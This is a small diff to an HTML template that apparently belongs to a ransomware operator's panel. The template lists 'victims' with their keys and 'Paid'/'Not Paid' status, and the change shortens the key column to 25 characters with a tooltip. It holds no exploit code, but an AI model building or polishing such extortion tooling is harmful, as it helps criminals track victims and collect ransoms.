@@ -32,7 +32,7 @@
                     {% for victim in victims %}
                     <tr>
                         <td>{{ victim.id }}</td>
-                        <td>{{ victim.key }}</td>
+                        <td title="{{ victim.key }}">{{ victim.key[:25] }}{% if victim.key|length > 25 %}...{% endif %}</td>
                         <td>{{ "Paid" if victim.payment_status else "Not Paid" }}</td>
                         <td>
                             <label>
